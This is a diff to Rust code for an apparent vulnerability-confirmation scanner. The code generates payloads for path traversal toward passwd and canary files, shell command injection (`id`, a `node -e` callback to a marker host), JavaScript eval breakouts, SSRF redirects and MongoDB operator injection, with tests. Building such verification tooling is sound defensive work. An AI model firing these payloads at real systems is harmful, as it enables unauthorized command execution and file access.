@@ -40,10 +40,16 @@ pub const PLANTED_DIR: &str = "jss-canary-read.d";
 /// observably distinct. Kept distinct from the text canary so the two never clash.
 pub const PLANTED_IMAGE: &str = "jss-canary-img";
 
-/// A minimal valid 1×1 PNG, standard-alphabet base64, planted at [`Canary::planted_image_file`].
+/// A minimal valid 1×1 PNG planted at [`Canary::planted_image_file`].
 /// Deliberately token-independent, like the text canary's path: the differential oracle
 /// (found-branch renders, not-found-branch errors), not any reflected content, is the proof.
-pub const PLANTED_IMAGE_PNG_BASE64: &str = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
+pub const PLANTED_IMAGE_PNG: &[u8] = &[
+    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
+    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
+    0x89, 0x00, 0x00, 0x00, 0x0b, 0x49, 0x44, 0x41, 0x54, 0x78, 0xda, 0x63, 0xfc, 0xcf, 0xc0, 0x50,
+    0x0f, 0x00, 0x04, 0x85, 0x01, 0x80, 0x84, 0xa9, 0x8c, 0x21, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
+    0x4e, 0x44, 0xae, 0x42, 0x60, 0x82,
+];
 
 /// A per-run marker. Everything a payload does is tagged with `token`, so a reproduction is told
 /// from the app's normal behavior by the token alone.
@@ -51,6 +57,7 @@ pub const PLANTED_IMAGE_PNG_BASE64: &str = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYA
 pub struct Canary {
     pub token: String,
     callback_host: Option<String>,
+    marker_host: Option<String>,
 }
 
 impl Canary {
@@ -58,6 +65,7 @@ impl Canary {
         Self {
             token,
             callback_host: None,
+            marker_host: None,
         }
     }
 
@@ -68,8 +76,26 @@ impl Canary {
         self
     }
 
+    pub fn with_marker_host(mut self, host: Option<String>) -> Self {
+        self.marker_host = host;
+        self
+    }
+
     pub fn marker_host(&self) -> &str {
-        self.callback_host.as_deref().unwrap_or(MARKER_HOST)
+        self.marker_host
+            .as_deref()
+            .or(self.callback_host.as_deref())
+            .unwrap_or(MARKER_HOST)
+    }
+
+    /// Public Satori callbacks only accept TLS, while the isolated marker also exposes plain HTTP.
+    /// Keep that transport choice beside the host so every out-of-band payload uses the same origin.
+    pub fn marker_scheme(&self) -> &str {
+        if self.marker_host.is_none() && self.callback_host.is_some() {
+            "https"
+        } else {
+            "http"
+        }
     }
 
     pub fn callback_host(&self) -> Option<&str> {
@@ -80,7 +106,7 @@ impl Canary {
     /// deliberately independent of the token: an endpoint that merely reflects the requested
     /// URL must never satisfy the read proof.
     pub fn planted_file(&self) -> String {
-        "/jss-canary-read".to_owned()
+        "/tmp/jss-canary-read".to_owned()
     }
 
     /// Every path the canary is planted at: the bare file and one per extension a handler commonly
@@ -99,13 +125,13 @@ impl Canary {
     /// the file (rather than echoing it) has an observably successful found-branch; see
     /// [`PLANTED_IMAGE`]. Independent of the token, like [`Canary::planted_file`].
     pub fn planted_image_file(&self) -> String {
-        format!("/{PLANTED_IMAGE}")
+        format!("/tmp/{PLANTED_IMAGE}")
     }
 
     /// The directory the sandbox plants for a traversal whose sink appends a fixed segment after the
     /// tainted input: the token file lives at `<planted_dir>/<suffix>`, and the payload climbs here.
     pub fn planted_dir(&self) -> String {
-        format!("/{PLANTED_DIR}")
+        format!("/tmp/{PLANTED_DIR}")
     }
 
     /// The JSON document planted at `<planted_dir>/<suffix>`: the token under common field names a
@@ -146,11 +172,32 @@ impl Canary {
     /// The marker service URL a request-payload is aimed at, carrying the probe's token in its
     /// path. The sandbox runs the service on the app's private network under `jss-marker`.
     pub fn service_url(&self, nonce: u32) -> String {
+        self.service_url_for_token(&self.service_token(nonce))
+    }
+
+    pub fn service_url_for_token(&self, token: &str) -> String {
         format!(
-            "http://{}/{}",
+            "{}://{}/{}",
+            self.marker_scheme(),
             self.marker_host(),
-            self.service_token(nonce)
+            token
         )
+    }
+
+    /// A DNS spelling of the local marker for handlers that reject literal loopback addresses
+    /// without resolving hostnames before the outbound request. `lvh.me` resolves only to
+    /// 127.0.0.1; the marker itself remains bound to loopback. Docker sessions use their private
+    /// `jss-marker` alias directly and need no alternate spelling.
+    fn local_dns_service_url_for_token(&self, token: &str) -> Option<String> {
+        let (host, port) = self.marker_host().rsplit_once(':')?;
+        (host == "0x7f000001" && port.parse::<u16>().is_ok())
+            .then(|| format!("http://lvh.me:{port}/{token}"))
+    }
+
+    fn public_service_url_for_token(&self, token: &str) -> Option<String> {
+        self.callback_host
+            .as_deref()
+            .map(|host| format!("https://{host}/{token}"))
     }
 }
 
@@ -195,7 +242,7 @@ pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
     if probe.class == VulnClass::PathTraversal && probe.lists_dir {
         return dir_attempts;
     }
-    let mut payloads = payloads(probe.class, canary, nonce);
+    let mut payloads = payloads(probe, canary, nonce);
     // A traversal sink that appends a fixed segment after the tainted input reads
     // `<tainted-dir>/<suffix>`, never the tainted value itself. Climb to a planted canary
     // directory so the handler's own appended segment completes the path to the token file.
@@ -223,6 +270,16 @@ pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
     if let Some(doc) = &probe.doc_envelope {
         for (value, _) in payloads.iter_mut() {
             *value = doc_encode(doc, value);
+        }
+    }
+    // The handler base64-decodes its tainted input into a raw string the sink consumes directly
+    // (`eval(Buffer.from(c, 'base64').toString())`), so the raw payload never reaches the sink as
+    // itself. Base64-encode each payload in the alphabet the handler decodes, so the decode
+    // reconstructs the exact payload the sink evaluates. Mutually exclusive with the envelope case,
+    // which already base64-encodes its packed object.
+    if let Some(url_safe) = probe.decode_base64 {
+        for (value, _) in payloads.iter_mut() {
+            *value = base64(value.as_bytes(), url_safe);
         }
     }
     let rest: Vec<Attempt> = payloads
@@ -295,11 +352,13 @@ pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
                     for gate in &probe.gate_paths {
                         let gate = gate.trim_end_matches('/');
                         out.push(upgrade(format!(
-                            "http://{}{gate}/{token}",
+                            "{}://{}{gate}/{token}",
+                            canary.marker_scheme(),
                             canary.marker_host()
                         )));
                         out.push(upgrade(format!(
-                            "http://{}{gate}?jss={token}",
+                            "{}://{}{gate}?jss={token}",
+                            canary.marker_scheme(),
                             canary.marker_host()
                         )));
                     }
@@ -316,21 +375,26 @@ pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
                     target: value.clone(),
                     ..as_path.clone()
                 };
-                let mut out = vec![as_path, absolute];
+                // `Entry::Url` means the raw request target itself is the tainted value. Try the
+                // RFC absolute form first: it is the direct host-override primitive and avoids an
+                // out-of-band callback wait on the path-shaped fallback in the common forward-proxy
+                // case.
+                let mut out = vec![absolute, as_path];
                 // A handler that resolves only the request *path* against a fixed base
                 // (`new URL(url.pathname, base)`, a path-prefixing proxy) keeps the base's host for an
                 // ordinary path, but a protocol-relative path (`//host/..`, RFC 3986 §4.2 network-path
                 // reference) overrides it: the resolved URL takes the attacker's host while inheriting
                 // the base's scheme. Send the marker host that way so a path-only proxy still lands at
                 // the marker. Carries the probe token so its hit is told from any other request.
-                let token = canary.service_token(nonce);
-                out.push(Attempt {
-                    verb,
-                    target: format!("//{}/{token}", canary.marker_host()),
-                    body: None,
-                    headers: Vec::new(),
-                    signal: Signal::ServiceReached(token),
-                });
+                if let Some((_, authority_and_path)) = value.split_once("://") {
+                    out.push(Attempt {
+                        verb,
+                        target: format!("//{authority_and_path}"),
+                        body: None,
+                        headers: Vec::new(),
+                        signal: signal.clone(),
+                    });
+                }
                 // The parsed request URL may feed its query parameters into the sink, with one of
                 // them chosen as the outbound host (`const q = Object.fromEntries(url.searchParams);
                 // fetch(q.base + endpoint)`). Send the marker URL in each query parameter the handler
@@ -385,6 +449,27 @@ pub fn attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<Attempt> {
                         headers: Vec::new(),
                         signal: signal.clone(),
                     });
+                }
+                // A handler that reads the *whole* query string off the raw request URL
+                // (`const q = req.url.split('?')[1]`) never parses named parameters, so the payload is
+                // the raw query string itself, under each path the handler dispatches on. The raw target
+                // is sent verbatim (no percent-encoding, since the handler does not decode it), so only a
+                // space/control-free payload can ride it; command injection reads the query inside a
+                // shell, so a space-free payload still runs.
+                if matches!(
+                    probe.class,
+                    VulnClass::CommandInjection | VulnClass::CodeInjection
+                ) && client_safe_target(&value)
+                {
+                    for gate in url_raw_gates(probe) {
+                        out.push(Attempt {
+                            verb,
+                            target: format!("{gate}?{value}"),
+                            body: None,
+                            headers: Vec::new(),
+                            signal: signal.clone(),
+                        });
+                    }
                 }
                 return out;
             }
@@ -517,7 +602,10 @@ pub fn read_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<ReadOracle
     // after the tainted input; otherwise the planted text file, plus the planted image for a sink
     // that re-encodes the file (so its found-branch renders rather than erroring like a miss).
     let present_names: Vec<String> = if probe.read_suffix.is_some() {
-        vec![PLANTED_DIR.to_owned()]
+        // The suffix document is planted at `/tmp/<dir>/<suffix>`. Keep `tmp/` in the climbed
+        // value: enough `..` segments normalize to the filesystem root, so using only `<dir>` would
+        // incorrectly look for `/<dir>/<suffix>` and make every fixed-suffix oracle a miss.
+        vec![canary.planted_dir().trim_start_matches('/').to_owned()]
     } else {
         vec![
             canary.planted_file().trim_start_matches('/').to_owned(),
@@ -634,7 +722,7 @@ pub fn delete_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<Delet
         return None;
     }
     let unique = format!("jss-del-{}-{nonce}", canary.token);
-    let dir = format!("/{PLANTED_DIR}/{unique}");
+    let dir = format!("/tmp/{PLANTED_DIR}/{unique}");
     let climb = "../".repeat(12);
     // When the handler appends further request fields after the tainted segment (`path.join(base,
     // type, id)`), the tainted value is only a directory prefix: it climbs to the planted directory
@@ -659,19 +747,19 @@ pub fn delete_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<Delet
         }
         let suffix = segments.join("/");
         (
-            format!("{climb}{PLANTED_DIR}/{unique}"),
+            format!("{climb}tmp/{PLANTED_DIR}/{unique}"),
             format!("{dir}/{suffix}"),
             probe,
         )
     } else {
         match &probe.read_suffix {
             Some(suffix) => (
-                format!("{climb}{PLANTED_DIR}/{unique}"),
+                format!("{climb}tmp/{PLANTED_DIR}/{unique}"),
                 format!("{dir}/{}", suffix.trim_start_matches('/')),
                 probe.clone(),
             ),
             None => (
-                format!("{climb}{PLANTED_DIR}/{unique}/target"),
+                format!("{climb}tmp/{PLANTED_DIR}/{unique}/target"),
                 format!("{dir}/target"),
                 probe.clone(),
             ),
@@ -718,11 +806,11 @@ pub fn create_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<Creat
         return None;
     }
     let unique = format!("jss-mk-{}-{nonce}", canary.token);
-    let dir = format!("/{PLANTED_DIR}/{unique}");
-    let control = format!("/{PLANTED_DIR}/{unique}-keep");
+    let dir = format!("/tmp/{PLANTED_DIR}/{unique}");
+    let control = format!("/tmp/{PLANTED_DIR}/{unique}-keep");
     let climb = "../".repeat(12);
-    let to_dir = format!("{climb}{PLANTED_DIR}/{unique}");
-    let to_leaf = format!("{climb}{PLANTED_DIR}/{unique}/jss-mk-leaf");
+    let to_dir = format!("{climb}tmp/{PLANTED_DIR}/{unique}");
+    let to_leaf = format!("{climb}tmp/{PLANTED_DIR}/{unique}/jss-mk-leaf");
     let present: Vec<Attempt> = [to_dir, to_leaf]
         .into_iter()
         .filter_map(|value| place_traversal(probe, &value))
@@ -772,11 +860,11 @@ pub fn overwrite_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<Ov
         return None;
     }
     let unique = format!("jss-ow-{}-{nonce}", canary.token);
-    let dir = format!("/{PLANTED_DIR}/{unique}");
+    let dir = format!("/tmp/{PLANTED_DIR}/{unique}");
     let target_path = format!("{dir}/target");
     let control_path = format!("{dir}/jss-ow-keep");
     let climb = "../".repeat(12);
-    let value = format!("{climb}{PLANTED_DIR}/{unique}/target");
+    let value = format!("{climb}tmp/{PLANTED_DIR}/{unique}/target");
     let mut paths: Vec<String> = vec![probe.path.clone()];
     for alt in &probe.alt_paths {
         if !paths.contains(alt) {
@@ -1145,6 +1233,12 @@ pub struct NosqlCase {
     /// The absent scalar token injected inside the operator objects, so a response that echoes the
     /// payload (a cast-error message, say) can be normalized out before the controls are compared.
     pub absent: String,
+    /// The per-probe unique numeric values this case stamps into its unconstrained body siblings
+    /// (one per `match_all`/`match_none_eq`/`match_none_in`). A write handler that inserts the request
+    /// under a unique key (`register`) gets a distinct key each probe, and the DB-state differential
+    /// uses these to exclude the probe's own inserted documents when measuring whether the injected
+    /// operator changed a pre-existing document. Empty for a query case or a case with no siblings.
+    pub identity: Vec<String>,
 }
 
 const NOSQL_FIELDS: [&str; 15] = [
@@ -1173,9 +1267,14 @@ pub fn nosql_cases(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<NosqlCase>
             probe, field, filler, &absent,
         ));
     }
-    cases.extend(fields.iter().map(|field| match &probe.entry {
-        Entry::Query(_) => nosql_query_case(probe, field, &absent),
-        _ => nosql_body_case(probe, &primary, field, &absent),
+    // A distinct numeric identity base per case so inserted-document keys never collide across cases.
+    let id_origin = (nonce as u64).wrapping_mul(1000).wrapping_add(1_000_000);
+    cases.extend(fields.iter().enumerate().map(|(index, field)| {
+        let id_base = id_origin.wrapping_add((index as u64) * 10);
+        match &probe.entry {
+            Entry::Query(_) => nosql_query_case(probe, field, &absent),
+            _ => nosql_body_case(probe, &primary, field, &absent, id_base),
+        }
     }));
     cases
 }
@@ -1201,6 +1300,7 @@ fn nosql_body_case(
     primary: &Option<String>,
     field: &str,
     absent: &str,
+    id_base: u64,
 ) -> NosqlCase {
     let verb = probe.method.verb(&Entry::Body(None));
     // When the handler iterates this field and queries each element (`for (const d of device_names)
@@ -1208,7 +1308,13 @@ fn nosql_body_case(
     // (an `.isArray()` validator rejects a bare operator object outright). Ride the operator inside a
     // one-element array for the iterated field only; other probed field names keep the direct form.
     let wrap_array = probe.array_element && primary.as_deref() == Some(field);
-    let body = |operator: String| {
+    let has_unique_identity = probe.nosql_inserts_before_sink
+        && (probe.siblings.iter().any(|(key, value)| {
+            key != field && value == ENVELOPE_PLACEHOLDER && nosql_identity_sibling(key)
+        }) || primary
+            .as_ref()
+            .is_some_and(|name| name != field && nosql_identity_sibling(name)));
+    let body = |operator: String, identity: u64| {
         let operator = if wrap_array {
             format!("[{operator}]")
         } else {
@@ -1224,10 +1330,32 @@ fn nosql_body_case(
         members.retain(|(key, _)| key != field);
         let mut obj = format!("{{\"{}\":{operator}", json_escape(field));
         for (key, value) in &members {
+            // An unconstrained generic filler becomes a per-probe-unique numeric value: a
+            // registration-style handler that inserts the request under a unique key (`username`) then
+            // gets a distinct key on each of the three probes instead of colliding, and a numeric
+            // field (`coin: Number`) casts cleanly from the digits. A constrained filler (a validator
+            // type, an equality-guarded literal) is kept verbatim so its guard still passes. For a
+            // document-filtering sink the opposite is needed: the sibling is ANDed into the query, so
+            // it must stay one constant string across all three probes (and match the seeded record)
+            // and remain a string the handler can call `.toLowerCase()`/`.trim()` on, never a number.
+            let value = if probe.nosql_inserts_before_sink
+                && value == "jsspector"
+                && nosql_identity_sibling(key)
+            {
+                format!("jsspector-{identity}")
+            } else if value == ENVELOPE_PLACEHOLDER {
+                if (probe.nosql_lookup && !probe.nosql_inserts_before_sink) || has_unique_identity {
+                    ENVELOPE_PLACEHOLDER.to_owned()
+                } else {
+                    identity.to_string()
+                }
+            } else {
+                value.clone()
+            };
             obj.push_str(&format!(
                 ",\"{}\":{}",
                 json_escape(key),
-                json_member_value(value)
+                json_member_value(&value)
             ));
         }
         obj.push('}');
@@ -1241,11 +1369,39 @@ fn nosql_body_case(
     };
     NosqlCase {
         field: field.to_owned(),
-        match_all: body(format!("{{\"$ne\":\"{}\"}}", json_escape(absent))),
-        match_none_eq: body(format!("{{\"$eq\":\"{}\"}}", json_escape(absent))),
-        match_none_in: body("{\"$in\":[]}".to_owned()),
+        match_all: body(
+            format!("{{\"$ne\":\"{}\"}}", json_escape(absent)),
+            id_base + 1,
+        ),
+        match_none_eq: body(
+            format!("{{\"$eq\":\"{}\"}}", json_escape(absent)),
+            id_base + 2,
+        ),
+        match_none_in: body("{\"$in\":[]}".to_owned(), id_base + 3),
         absent: absent.to_owned(),
+        identity: [id_base + 1, id_base + 2, id_base + 3]
+            .into_iter()
+            .map(|identity| {
+                if has_unique_identity {
+                    format!("jsspector-{identity}")
+                } else {
+                    identity.to_string()
+                }
+            })
+            .collect(),
     }
+}
+
+/// Registration-style handlers commonly constrain the inserted document with a unique username,
+/// email, handle, or login. The generic string filler is valid for those fields, but reusing it
+/// across the positive and negative controls makes the controls fail at the unique index before
+/// they reach the vulnerable lookup. Keep the list deliberately limited to identity-shaped keys;
+/// values such as `role` may be enum constrained and must remain unchanged.
+fn nosql_identity_sibling(key: &str) -> bool {
+    matches!(
+        key.to_ascii_lowercase().as_str(),
+        "username" | "email" | "handle" | "login" | "account" | "user"
+    )
 }
 
 /// Place MongoDB operators in the query parameter actually consumed by a query-sourced sink.
@@ -1278,6 +1434,7 @@ fn nosql_query_case(probe: &Probe, field: &str, absent: &str) -> NosqlCase {
         match_none_eq: attempt(format!("[$eq]={}", encode(absent))),
         match_none_in: attempt(format!("[$in][]={}", encode(absent))),
         absent: absent.to_owned(),
+        identity: Vec::new(),
     }
 }
 
@@ -1324,6 +1481,7 @@ fn nosql_body_query_override_case(
         match_none_eq: attempt(format!("[$eq]={}", encode(absent))),
         match_none_in: attempt(format!("[$in][]={}", encode(absent))),
         absent: absent.to_owned(),
+        identity: Vec::new(),
     }
 }
 
@@ -1461,9 +1619,12 @@ fn body_fields(class: VulnClass) -> &'static [&'static str] {
     }
 }
 
-/// The payload strings for a class, each with the signal it would trip. A read-marker payload is
-/// confirmed in the response; a write- or call-marker payload, out of band.
-fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
+/// The payload strings for a probe, each with the signal it would trip. A read-marker payload is
+/// confirmed in the response; a write- or call-marker payload, out of band. The command-injection
+/// arm reads the probe's shell-quote and `path.dirname` context so the separator survives the exact
+/// way the handler builds and transforms the command.
+fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
+    let class = probe.class;
     match class {
         VulnClass::PathTraversal => {
             let file = canary.planted_file();
@@ -1478,7 +1639,7 @@ fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signa
                 (file.clone(), Signal::InResponse),
                 (format!("/{name}"), Signal::InResponse),
             ];
-            for depth in [1usize, 3, 6, 10] {
+            for depth in [1usize, 3, 6, 10, 16, 24] {
                 let up = "../".repeat(depth);
                 out.push((format!("{up}{passwd}"), passwd_signal.clone()));
                 out.push((
@@ -1500,62 +1661,147 @@ fn payloads(class: VulnClass, canary: &Canary, nonce: u32) -> Vec<(String, Signa
             // bare-name payloads above.
             for ext in PLANTED_SUFFIXES.iter().filter(|ext| !ext.is_empty()) {
                 out.push((format!("/{name}{ext}"), Signal::InResponse));
-                for depth in [1usize, 3, 6, 10] {
+                for depth in [1usize, 3, 6, 10, 16, 24] {
                     let up = "../".repeat(depth);
                     out.push((format!("{up}{name}{ext}"), Signal::InResponse));
                 }
             }
             out
         }
-        VulnClass::CommandInjection => {
-            // Use only the read-only `id` command. The forced-error variants write its output to
-            // stderr and make the shell command fail, so handlers that expose an execution error
-            // return the real process identity; the plain variants cover handlers that return
-            // stdout. The trailing comment prevents arguments appended by the vulnerable command
-            // from being passed to `id`. A blind endpoint with no observable output remains
-            // not-reproduced rather than being verified through a filesystem side effect.
-            [
-                "x; id >&2; false; #",
-                "x| id >&2; false; #",
-                "x\nid >&2; false; #",
-                "x; id #",
-                "x| id #",
-                "x\nid #",
-            ]
-            .into_iter()
-            .map(|value| {
-                (
-                    value.to_owned(),
-                    Signal::ResponseContains("uid=".to_owned()),
-                )
-            })
-            .collect()
-        }
+        VulnClass::CommandInjection => command_injection_payloads(probe, canary, nonce),
         VulnClass::CodeInjection => {
-            // JavaScript that writes the marker file if the value is evaluated or required as a
-            // module specifier that resolves to an expression context.
+            // Two independent proofs that the value is evaluated as JavaScript, so a hit is seen
+            // regardless of the module system the app runs under. The file-write proof uses
+            // `require('fs')`, which exists only in a CommonJS module. The callback proof uses the
+            // global `fetch` (Node 18+, present in both CommonJS and ES modules — an ESM app has no
+            // `require`), making a benign out-of-band request to the marker service carrying this
+            // probe's token; a reachable hit in the marker log is the signal, exactly as the
+            // blind-command-injection callback is. Nothing here is tied to a specific target.
             let hit = canary.written_file(nonce);
-            let js = format!("require('fs').writeFileSync('{hit}','1')");
-            let signal = Signal::FileWritten(hit);
-            [
-                format!("');{js};//"),
-                format!("\");{js};//"),
-                format!(";{js};"),
-                js,
-            ]
-            .into_iter()
-            .map(|value| (value, signal.clone()))
-            .collect()
+            let write_js = format!("require('fs').writeFileSync('{hit}','1')");
+            let write_signal = Signal::FileWritten(hit);
+            let token = canary.service_token(nonce);
+            let callback_js = format!(
+                "fetch('{}://{}/{token}')",
+                canary.marker_scheme(),
+                canary.marker_host()
+            );
+            let callback_signal = Signal::ServiceReached(token);
+            // Each payload is produced both bare (the whole evaluated string) and as a string/stmt
+            // breakout, so it lands whether the tainted value is the entire `eval` argument or is
+            // interpolated inside a larger evaluated expression.
+            let shape = |js: &str| {
+                [
+                    js.to_owned(),
+                    format!("');{js};//"),
+                    format!("\");{js};//"),
+                    format!(";{js};"),
+                ]
+            };
+            let mut out: Vec<(String, Signal)> = Vec::new();
+            for value in shape(&callback_js) {
+                out.push((value, callback_signal.clone()));
+            }
+            for value in shape(&write_js) {
+                out.push((value, write_signal.clone()));
+            }
+            out
         }
         VulnClass::Ssrf => {
             // Point the request at the marker service; a reachable hit is the signal.
-            vec![(
+            let token = canary.service_token(nonce);
+            let mut out = vec![(
                 canary.service_url(nonce),
-                Signal::ServiceReached(canary.service_token(nonce)),
-            )]
+                Signal::ServiceReached(token.clone()),
+            )];
+            if let Some(url) = canary.local_dns_service_url_for_token(&token) {
+                out.push((url, Signal::ServiceReached(token.clone())));
+            }
+            if let Some(url) = canary.public_service_url_for_token(&token) {
+                out.push((url, Signal::ServiceReached(token)));
+            }
+            out
         }
         _ => Vec::new(),
     }
+}
+
+/// Command-injection payloads shaped to the exact way the handler builds and transforms the shell
+/// command (see [`Probe::cmd_quote`], [`Probe::cmd_dir_segment`]).
+///
+/// Each payload supplies a shell separator so an injected command runs, then a trailing `#` comment
+/// so whatever the vulnerable template appends after the value (a closing quote) is ignored. When the
+/// value is interpolated inside a quote, the payload first closes that quote. When the value passes
+/// through `path.dirname()` before the sink, a sacrificial trailing `/x` is appended: `dirname` drops
+/// it (and nothing else), so the injection lands in the surviving parent portion rather than being
+/// discarded as the final segment.
+///
+/// Two oracles are produced per separator. A reflected oracle runs `id` and is confirmed by `uid=` in
+/// the response — for handlers that echo command output or an execution error. A blind oracle makes
+/// an out-of-band HTTP callback to the marker service carrying this probe's token, confirmed from the
+/// marker log — for the common sink that discards the child process's output (`exec(cmd)` with no
+/// callback). The callback uses `node`, always present in the application image, and addresses the
+/// marker through an options object (no `//` in the command) so an intervening `path.join`/`normalize`
+/// cannot collapse the URL. A benign request never carries the token, so the callback is a genuine
+/// positive with an implicit negative control; nothing here is tied to a specific target.
+fn command_injection_payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
+    let token = canary.service_token(nonce);
+    // Every space is written as `${IFS}` so the whole payload is free of spaces and control
+    // characters. A shell still word-splits on `$IFS`, but the space-free string can also ride a raw
+    // request target (`req.url.split('?')[1]`, a handler that reads the whole query string without
+    // decoding it) that an HTTP client would otherwise reject for containing an unescaped space, and
+    // it survives percent-encoding into a named query parameter or JSON body unchanged.
+    let authority = match canary.marker_host().rsplit_once(':') {
+        Some((hostname, port)) if port.parse::<u16>().is_ok() => {
+            format!("hostname:\"{hostname}\",port:{port}")
+        }
+        _ => format!("hostname:\"{}\"", canary.marker_host()),
+    };
+    let callback = format!(
+        "node${{IFS}}-e${{IFS}}'require(\"{}\").get({{{authority},path:\"/{token}\"}})'",
+        canary.marker_scheme(),
+    );
+    let inners: [(String, Signal); 3] = [
+        (
+            "id>&2;false".to_owned(),
+            Signal::ResponseContains("uid=".to_owned()),
+        ),
+        ("id".to_owned(), Signal::ResponseContains("uid=".to_owned())),
+        (callback, Signal::ServiceReached(token)),
+    ];
+    let mut out = Vec::new();
+    for sep in [";", "|", "\n"] {
+        for (inner, signal) in &inners {
+            let mut value = String::new();
+            if let Some(quote) = probe.cmd_quote {
+                value.push(quote);
+            }
+            value.push_str(&format!("x{sep}{inner}{sep}#"));
+            if probe.cmd_dir_segment {
+                value.push_str("/x");
+            }
+            out.push((value, signal.clone()));
+        }
+    }
+    out
+}
+
+/// Whether a payload can ride a raw request target: it holds only visible ASCII (no spaces, no control
+/// characters), which an HTTP client will send verbatim and a handler that reads the whole query string
+/// without decoding (`req.url.split('?')[1]`) will see unchanged.
+fn client_safe_target(value: &str) -> bool {
+    value.bytes().all(|b| (0x21..=0x7e).contains(&b))
+}
+
+/// The paths a URL-sourced sink dispatches on: each mined gate path, plus the probe's own route when
+/// that is a fixed path. The raw-query command-injection placement tries each, since the handler reaches
+/// the sink only for a URL it recognizes (`if (req.url.indexOf('/api/ids') !== -1)`).
+fn url_raw_gates(probe: &Probe) -> Vec<String> {
+    let mut gates: Vec<String> = probe.gate_paths.clone();
+    if !probe.path.is_empty() && !probe.path.contains('{') && !gates.contains(&probe.path) {
+        gates.push(probe.path.clone());
+    }
+    gates
 }
 
 /// Puts `value` where the probe said it enters, returning the full request.
@@ -2354,7 +2600,51 @@ mod tests {
             alt_paths: Vec::new(),
             auth: None,
             multipart: None,
+            cmd_quote: None,
+            cmd_dir_segment: false,
+            nosql_lookup: false,
+            nosql_inserts_before_sink: false,
+            nosql_mutates: false,
+            decode_base64: None,
         }
+    }
+
+    #[test]
+    fn a_base64_decoded_code_injection_rides_an_esm_safe_callback() {
+        // A code-injection sink whose input is base64-decoded before `eval`: every payload must be
+        // base64-encoded so the handler's decode reconstructs it, and at least one payload must use the
+        // global `fetch` (available in an ES module, which has no `require`) so the proof is seen in an
+        // ESM app. The decoded callback is confirmed out of band at the marker service.
+        let canary = Canary::new("tok".to_owned());
+        let mut p = probe(VulnClass::CodeInjection, "/api", Entry::Url);
+        p.url_query_params = vec!["c".to_owned()];
+        p.decode_base64 = Some(false);
+        let a = attempts(&p, &canary, 1);
+        // The ESM-safe callback decodes to a `fetch` to the marker service carrying this probe's token.
+        let want_callback = base64(
+            format!(
+                "fetch('http://{}/{}')",
+                MARKER_HOST,
+                canary.service_token(1)
+            )
+            .as_bytes(),
+            false,
+        );
+        let callback = a
+            .iter()
+            .find(|att| att.target == format!("/api?c={}", encode(&want_callback)))
+            .expect("the fetch callback rides the mined query parameter, base64-encoded");
+        assert_eq!(
+            callback.signal,
+            Signal::ServiceReached(canary.service_token(1))
+        );
+        // No attempt carries a raw, un-encoded payload: a handler that base64-decodes would never
+        // see it as code.
+        assert!(
+            a.iter()
+                .all(|att| !att.target.contains("fetch(") && !att.target.contains("require(")),
+            "payloads must be base64-encoded before entering the request"
+        );
     }
 
     #[test]
@@ -2494,7 +2784,11 @@ mod tests {
             delete_oracle(&p, &canary, 7).expect("a path-param removal sink has an oracle");
         // The target sits outside the base directory (under the planted-canary root) and ends in the
         // handler's own appended segment; the control is a sibling the request never names.
-        assert!(oracle.target_path.starts_with(&format!("/{PLANTED_DIR}/")));
+        assert!(
+            oracle
+                .target_path
+                .starts_with(&format!("/tmp/{PLANTED_DIR}/"))
+        );
         assert!(oracle.target_path.ends_with("/SKILL.md"));
         assert!(oracle.control_path.starts_with(&oracle.dir));
         assert_ne!(oracle.target_path, oracle.control_path);
@@ -2525,7 +2819,11 @@ mod tests {
         let oracle =
             delete_oracle(&p, &canary, 7).expect("an appended-field removal sink has an oracle");
         // The planted target is the leaf named by the appended field, not the tainted directory.
-        assert!(oracle.target_path.starts_with(&format!("/{PLANTED_DIR}/")));
+        assert!(
+            oracle
+                .target_path
+                .starts_with(&format!("/tmp/{PLANTED_DIR}/"))
+        );
         assert!(oracle.target_path.ends_with("/target"));
         assert!(oracle.control_path.starts_with(&oracle.dir));
         assert_ne!(oracle.target_path, oracle.control_path);
@@ -2622,7 +2920,55 @@ mod tests {
         let host = format!("{}.callback.satori.ci", "a".repeat(32));
         let canary = Canary::new("run".to_owned()).with_callback_host(Some(host.clone()));
         assert_eq!(canary.marker_host(), host);
-        assert_eq!(canary.service_url(2), format!("http://{host}/run-2"));
+        assert_eq!(canary.marker_scheme(), "https");
+        assert_eq!(canary.service_url(2), format!("https://{host}/run-2"));
+    }
+
+    #[test]
+    fn an_isolated_marker_stays_the_target_when_a_public_callback_is_registered() {
+        let host = format!("{}.callback.satori.ci", "a".repeat(32));
+        let canary = Canary::new("run".to_owned())
+            .with_callback_host(Some(host))
+            .with_marker_host(Some("0x7f000001:4321".to_owned()));
+        assert_eq!(canary.marker_host(), "0x7f000001:4321");
+        assert_eq!(canary.marker_scheme(), "http");
+        assert_eq!(canary.service_url(2), "http://0x7f000001:4321/run-2");
+    }
+
+    #[test]
+    fn a_local_ssrf_also_tries_a_dns_spelling_of_the_loopback_marker() {
